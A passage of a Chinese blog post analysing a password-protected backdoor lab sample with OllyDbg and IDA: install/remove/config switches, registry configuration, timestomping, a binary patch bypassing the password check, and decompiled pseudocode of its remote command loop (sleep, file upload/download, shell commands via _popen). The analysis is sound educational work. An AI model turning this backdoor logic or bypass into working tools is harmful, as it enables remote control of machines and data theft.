+<p>我们看到ida里是有这个函数的。这里在od中没出现是因为，在调试的过程中，step in很多次，已经创建了该服务，所以od没有进入该函数。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153921844.png" alt="image-20211117153921844"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117154049962.png" alt="image-20211117154049962"></p>
+<p>继续看。在<code>40380F</code>处调用 __mbscmp函数</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172003090.png" alt="image-20211116172003090"></p>
+<p>这是一个选择循环结构，根据__mbscmp函数的匹配结果来决定执行语句</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172353688.png" alt="image-20211116172353688"></p>
+<p><code>4015B0</code>处的<code>GetSystemDirectory</code>，这个函数能取得Windows系统目录（System目录）的完整路径名。在这个目录中，包含了所有必要的系统文件。根据微软的标准，其他定制控件和一些共享组件也可放到这个目录。通常应避免在这个目录里创建文件。在网络环境中，往往需要管理员权限才可对这个目录进行写操作。 </p>
+<p>这个函数主要是用来修改 复制文件、访问和最后变化的时间戳，来与<code>Kernel32.dll</code>保持一致。这个修改时间戳来和其他文件保持一致的技术叫<code>timestomping</code>，网上也有打包好的工具，自己写也很简单。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173949704.png" alt="image-20211116173949704"></p>
+<p>这里 <code>4011A8</code>创建注册表项<code>HKLM\SOFTWARE\Microsoft \\xps</code>，空格是为了让它显示更独特，可以看出是受感染的主机。接着在 <code>4011BE</code>处，edx寄存器指向 Data缓冲区，用来存储注册表项下 名为<code>Configuration</code>的键值。但是缓冲区的内容是什么呢？我们在<code>4011BE</code>处设置断点，然后F9进入执行，查看寄存器EDX的值，就可以看到加载到内存中的字符串。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116180114934.png" alt="image-20211116180114934"></p>
+<p>进入<code>ShellExecuteA</code>处，删除自身，接着退出程序</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117171453200.png" alt="image-20211117171453200"></p>
+<h3 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h3><p>传参改为-re继续调试</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155145688.png" alt="image-20211117155145688"></p>
+<p>一步步step in</p>
+<p>又是<code>402510</code>，这里前面已经分析过，是进行密码校验，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155443290.png" alt="image-20211117155443290"></p>
+<p>go on ，这里有一个<code>402900</code>，看看</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155628148.png" alt="image-20211117155628148"></p>
+<p>调用了<code>DeleteService</code>函数，删除指定的服务</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155715725.png" alt="image-20211117155715725"></p>
+<p>可以看出是将自己删除了</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155916159.png" alt="image-20211117155916159"></p>
+<p>继续</p>
+<p>后面调用了<code>ExpandEnvironmentStringsA</code>函数，扩展环境可变字符串，并将其替换为当前用户定义的值，这里就是将该字符串替换为空，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160129452.png" alt="image-20211117160129452"></p>
+<p>删除自己</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160405653.png" alt="image-20211117160405653"></p>
+<p>接着就结束了，这是re的功能：删除服务并且删除自身文件</p>
+<h3 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h3><p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160524042.png" alt="image-20211117160524042"></p>
+<p>这里注意刚刚执行-re的时候已经删除了服务，所以要先执行-in 来安装服务，这里也是找到了前面没发现的<code>CreateServiceA</code>函数</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160800094.png" alt="image-20211117160800094"></p>
+<p>这里就直接挑关键的分析</p>
+<p>一路f7，来到这里就可以确定是目的地了</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161510708.png" alt="image-20211117161510708"></p>
+<p>大概看一看这个函数的功能，发现跳转了4个地址，逐个看看</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161739076.png" alt="image-20211117161739076"></p>
+<p><code>402cd9</code>这里应该就是检验输入的字符串是不是-cc，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162149075.png" alt="image-20211117162149075"></p>
+<p><code>402ccf</code>这里判断参数个数是否为7</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162356923.png" alt="image-20211117162356923"></p>
+<p><code>401070</code>这里可以看到就是对注册表的操作了</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117163119830.png" alt="image-20211117163119830"></p>
+<p>调用<code>RegOpenKeyExA</code>，尝试打开注册表项 <code>HKLM\SOFTWARE\Microsoft \ \XPS</code>，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095906406.png" alt="image-20211117095906406"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116113808502.png" alt="image-20211116113808502"></p>
+<p>对-c 参数的分析就到这里，可以清楚它的功能是设置注册表项。</p>
+<h3 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h3><p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172231871.png" alt="image-20211117172231871"></p>
+<p>看到它调用的参数，<code>401028</code>这里。调用<code>RegQueryValueExA</code>函数，读取配置注册表的键值内容，并且将读取的数值放在缓冲区中，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172440164.png" alt="image-20211117172440164"></p>
+<p>在od中可以直接查看调用的参数</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172810303.png" alt="image-20211117172810303"></p>
+<p>查询注册表项的配置文件</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172934212.png" alt="image-20211117172934212"></p>
+<p>再来到ida中看细节，单步跟进，这里我浪费了很长时间，一点点看细节没有收获，直接跳到最后看函数返回值</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173449780.png" alt="image-20211117173449780"></p>
+<p>看样子像字符串拼接，和printf类似，跳转到call的地址</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173633852.png" alt="image-20211117173633852"></p>
+<p>f5看下反汇编，看来就是printf输出打印</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173830307.png" alt="image-20211117173830307"></p>
+<p>打印一下试试，果然，不过这些字符串，有域名，其他的看着像端口什么的。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117174117602.png" alt="image-20211117174117602"></p>
+<p>ok，-cc命令的作用就到这里，读取注册表中的项的内容并输出。</p>
+<h3 id="无参"><a href="#无参" class="headerlink" title="无参"></a>无参</h3><p>又回到了<code>401000</code>，往下找，跳到 <code>432060</code></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175420932.png" alt="image-20211117175420932"></p>
+<p>f5反汇编，一直在while循环，但是并没有终止条件。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175456369.png" alt="image-20211117175456369"></p>
+<p>来到<code>401640</code>，终于建立网络连接了，但是我机器断网的原因，这里返回false</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231628485.png" alt="image-20211117231628485"></p>
+<p>调用<code>send</code>函数，传入的参数是buf，即之前获取的注册表配置信息</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231732413.png" alt="image-20211117231732413"></p>
+<p>后面还有个<code>recv</code>函数，用来接收信息，接着做了一个比较，判断长度是否小于0，如果是，跳转到<code>401CAD</code>中，否则继续执行，跳转到</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117232340334.png" alt="image-20211117232340334"></p>
+<p>跳转到<code>401F10</code>处，调用了<code>strstr</code>，用来匹配字符串</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117233653687.png" alt="image-20211117233653687"></p>
+<p><code>401E60</code>处的伪代码，可以结合上面的分析来总结下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_401E60</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  u_short hostshort[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-1424h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-1420h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [esp+40Ch] [ebp-1020h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+410h] [ebp-101Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+414h] [ebp-1018h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">4</span>]; <span class="comment">// [esp+418h] [ebp-1014h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [esp+428h] [ebp-1004h]</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">4096</span>]; <span class="comment">// [esp+42Ch] [ebp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401420</span>(name, <span class="number">1024</span>) )				<span class="comment">//获取并截取注册表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401470</span>(hostshort) )				<span class="comment">//获取注册表键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401D80</span>(v8) )						<span class="comment">//延时</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_401AF0</span>(name, hostshort[<span class="number">0</span>], (<span class="keyword">int</span>)v8, Str, (<span class="keyword">int</span>)&amp;v6) )			<span class="comment">//建立socket通信并recv</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="built_in">strstr</span>(Str, asc_40C090);				<span class="comment">//匹配字符串</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v5 = v9;</span><br><span class="line">  v9 = <span class="built_in">strstr</span>(v9, asc_40C088);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v7 = v9;</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v5 + <span class="number">1</span> &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(a1, &amp;v5[<span class="built_in">strlen</span>(asc_40C090)], v7 - v5 - <span class="built_in">strlen</span>(asc_40C090));</span><br><span class="line">  a1[v7 - v5 - <span class="built_in">strlen</span>(asc_40C090)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要的功能就是用来获取字符串，如果获取成功，进入<code>40204c</code>，发现了sleep，upload等字样，f5看下伪代码</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117234434791.png" alt="image-20211117234434791"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_402020</span><span class="params">(<span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  u_short hostshort; <span class="comment">// [esp+4h] [ebp-424h]</span></span><br><span class="line">  FILE *Stream; <span class="comment">// [esp+8h] [ebp-420h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Command; <span class="comment">// [esp+Ch] [ebp-41Ch]</span></span><br><span class="line">  u_short v8; <span class="comment">// [esp+10h] [ebp-418h]</span></span><br><span class="line">  <span class="keyword">char</span> *lpFileName; <span class="comment">// [esp+14h] [ebp-414h]</span></span><br><span class="line">  u_short v10; <span class="comment">// [esp+18h] [ebp-410h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [esp+1Ch] [ebp-40Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *String; <span class="comment">// [esp+20h] [ebp-408h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+24h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Str1[<span class="number">1024</span>]; <span class="comment">// [esp+28h] [ebp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_401E60(Str1, <span class="number">1024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, Str2, <span class="built_in">strlen</span>(Str2)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    String = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v13 = atoi(String);</span><br><span class="line">    Sleep(<span class="number">1000</span> * v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aUpload, <span class="built_in">strlen</span>(aUpload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v2 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v10 = atoi(v2);</span><br><span class="line">    v11 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    <span class="keyword">if</span> ( sub_4019E0(name, v10, v11) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aDownload, <span class="built_in">strlen</span>(aDownload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v3 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    v8 = atoi(v3);</span><br><span class="line">    lpFileName = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401870(name, v8, lpFileName) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, aCmd_0, <span class="built_in">strlen</span>(aCmd_0)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(Str1, Delimiter);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, Delimiter);</span><br><span class="line">    hostshort = atoi(v4);</span><br><span class="line">    Command = strtok(<span class="number">0</span>, asc_40C0A4);</span><br><span class="line">    Stream = _popen(Command, Mode);</span><br><span class="line">    <span class="keyword">if</span> ( !Stream )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401790(name, hostshort, Stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      _pclose(Stream);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(Stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncmp</span>(Str1, aNothing, <span class="built_in">strlen</span>(aNothing));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>几个关键点</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>地址</th>
+<th>字符串命令格式</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sleep</td>
+<td>402076</td>
+<td>sleep secs</td>
+<td>sleep</td>
+</tr>
+<tr>
+<td>upload</td>
+<td>4019e0</td>
+<td>upload port filename</td>
+<td>通过端口port连接远程主机并读取内容，然后在本地创建filename文件</td>
+</tr>
+<tr>
+<td>download</td>
+<td>401870</td>
+<td>download port filename</td>
+<td>读取文件filename并且通过端口port发送到远程主机</td>
+</tr>
+<tr>
+<td>cmd</td>
+<td>402268</td>
+<td>cmd port command</td>
+<td>用cmd命令行运行shell命令，通过端口将输出发送到远程主机</td>
+</tr>
+<tr>
+<td>nothing</td>
+<td>402356</td>
+<td>nothing</td>
+<td>无操作</td>
+</tr>
+</tbody></table>
+<p>很明显，这里实现了后门的功能。但是还有一点，<code>upload</code>和<code>download</code>的功能好像与名称相反emm？？？还是不要纠结名字了吧。</p>
+<p>跳转到<code>401b35</code>，出现了get请求，http协议，请求<code>http://www.practicalmalwareanalysis.com</code>的80端口。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211118000720718.png" alt="image-20211118000720718"></p>
+<h3 id="另一种crack密码abcd姿势"><a href="#另一种crack密码abcd姿势" class="headerlink" title="另一种crack密码abcd姿势"></a>另一种crack密码abcd姿势</h3><p>另一种修改的方法。</p>
+<p>先反汇编下指令。直接填充</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B8 01 00 00 00 			mov eax,0x1</span><br><span class="line">C3						ret</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于call指令准备堆栈，而RET指令负责清理栈，我们可以覆盖密码检查函数的开头指令 <code>402510</code>处。</p>
+<p>编辑下二进制文件，binary，edit。</p>
+<p>因为我们想在原来只占1字节的空间写入6个字节的指令，所以这里不选保持大小，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116154949368.png" alt="image-20211116154949368"></p>
+<p>修改成功后</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155018687.png" alt="image-20211116155018687"></p>
+<p>右键复制到可执行文件，全部复制</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155617453.png" alt="image-20211116155617453"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155805936.png" alt="image-20211116155805936"></p>
+<p>检查下函数是否被成功禁用，使用命令参数-in重新调试。在<code>402510</code>处bypass，最后跳转到 <code>402B3F</code>。六条指令后，指向第一个命令行的参数的指针被push入栈，紧接着指向另外字符串（-in）的一个指针。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161003640.png" alt="image-20211116161003640"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161751006.png" alt="image-20211116161751006"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116164950265.png" alt="image-20211116164950265"></p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>这个样本大致功能就可以看出，反向连接远程服务器，实现后门。其中几个命令行参数，安装/配置/删除等等，需要首先crack密码“abcd”。在程序运行时，首先将自己复制到 <code>system32</code>目录，创建服务并自启，然后删除自己。安装后，该程序会读取注册表的配置信息，get请求远程服务，通过socket套接字，建立连接。</p>
+<p>反思: 这篇文章到了后面逻辑显得不是那么清晰，看出对od和ida的熟练度有待提高。希望下篇文章可以进步更多。</p>
+<p>Peace.</p>
+
+  </div>
+</article>
+
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '7u7uebjtVAc7zqC8W6KLczVp-gzGzoHsz',
+            appKey: 'MWpJPixdx6qnP8OBPnTR7Yd9',
+            placeholder: '',
+            avatar: 'mp'
+        })
+    </script>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links">Links</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
